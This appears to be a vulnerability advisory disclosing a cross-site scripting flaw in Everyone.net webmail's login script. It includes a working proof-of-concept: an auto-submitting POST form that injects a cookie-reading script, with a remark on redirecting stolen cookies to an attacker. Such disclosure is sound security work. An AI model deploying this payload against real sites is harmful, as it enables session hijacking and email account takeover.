Service: Webmail
Vendor: everyone / www.everyone.net
Vulnerability: Cross Site Scripting
Exploit included: Yes

Details:

Everyone.net is an email service provider, offering new email accounts for
personal email, group email, business email and outsourced email.
eveyone.net offers secure email hosting with email accounts that are fast
and reliable and provides full-featured email services for over 300,000
domains. their solutions include a range of features including Web Mail,
SpamShield Pro, Anti-Virus, IMAP, POP, SMTP and free domain registrations.
for more information visit their website at http://www.everyone.net

everyone's login perl script (loginuser.pl) is prone to cross-site
scripting attacks. This problem is due to a failure in the script to
properly sanitize user-supplied input when passed in variable loginName.

from loginuser.htm source code after submiting ">maliciousCode as a username:

<td align="right"><input type="text" name="loginName" size="15"
value="">maliciousCode" maxlength="100"></td></tr>

Impact:

an attacker can exploit the vulnerable scripts to have arbitrary script
code executed in the browser of an authentified everyone user in the
context of the vulnerable website. resulting in the theft of cookie-based
authentication giving the attacker full access to the victim's email
account as well as other type of attacks.


Affected script URL path:

www.vulnerable-site.com/email/scripts/loginuser.pl

Exploit:

i ve read in a paper that cross site scripting that requires using the
POST method instead of GET is not exploitable, that's false since POSTing
a form doesnt necessary requires using <input type ="submit" instead of
that we can use a javascript attribute to have the data automatically
posted.

everyone's exploit form:

<html>

<body onload="document.xploitform.submit(); ">

<form name="xploitform" method="post"
action="http://vulnerable-site/email/scripts/loginuser.pl">

<input type="hidden" name="loginName"
value='"><script>alert(document.cookie)</script>'>

<input type="hidden" name="user_pwd" value='anypassword'>

</form></body>

</html>

the above code can be placed on a web page by an attacker and have a
victim visit the page. the login name value can be changed to have the
cookie redirected and grabbed by the attacker
